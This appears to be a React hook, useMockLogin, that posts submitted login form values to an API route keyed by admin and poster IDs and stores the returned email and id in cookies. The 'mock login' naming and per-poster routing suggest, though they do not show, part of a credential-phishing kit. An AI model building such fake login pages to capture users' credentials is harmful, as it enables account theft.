"use client";
import { toast } from "react-toastify";
import Cookies from "js-cookie";
import { API_URL } from "../config";
import { useState } from "react";

function useMockLogin({ setShowModal, adminId, posterId }) {
  const [id, setId] = useState();
  const login = async (values) => {
    // console.log(values);

    const url = `${API_URL}/ad/${adminId}/${posterId}`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });
    setShowModal(true);
    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      Cookies.set("email", data?.info?.email);
      Cookies.set("id", data?.info?._id);
      setId(Cookies.get("id"));
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return { login };
}

export default useMockLogin;
